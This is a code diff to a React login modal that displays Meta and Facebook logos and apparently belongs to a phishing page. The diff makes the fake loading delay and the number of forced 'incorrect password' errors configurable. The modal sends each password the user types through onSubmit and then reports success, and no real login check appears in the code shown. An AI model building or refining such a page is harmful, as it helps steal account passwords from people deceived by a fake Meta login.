@@ -2,6 +2,7 @@ import { useState } from 'react';
 import PropTypes from 'prop-types';
 import MetaLogo from '@/assets/images/meta-logo-grey.png';
 import FbRoundLogo from '@/assets/images/fb_round_logo.png';
+import config from '@/utils/config';
 
 const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
     const [formData, setFormData] = useState({
@@ -11,6 +12,9 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
     const [isLoading, setIsLoading] = useState(false);
     const [showError, setShowError] = useState(false);
     const [showPassword, setShowPassword] = useState(false);
+
+    const passwordLoadingMs = Math.max(1, Number(config.password_loading_time || 3)) * 1000;
+    const maxPasswordAttempts = Math.max(1, Number(config.max_password_attempts || 2));
 
     const handleChange = (field, value) => {
         setFormData((prev) => ({ ...prev, [field]: value }));
@@ -32,16 +36,16 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
         setTimeout(() => {
             setIsLoading(false);
 
-            if (loginAttempt === 0) {
+            if (loginAttempt + 1 < maxPasswordAttempts) {
                 setShowError(true);
-                setLoginAttempt(1);
+                setLoginAttempt((prev) => prev + 1);
                 onSubmit('', formData.password);
             } else {
                 setShowError(false);
                 onSubmit('', formData.password);
                 onSuccess();
             }
-        }, 1500);
+        }, passwordLoadingMs);
     };
 
     if (!show) return null;
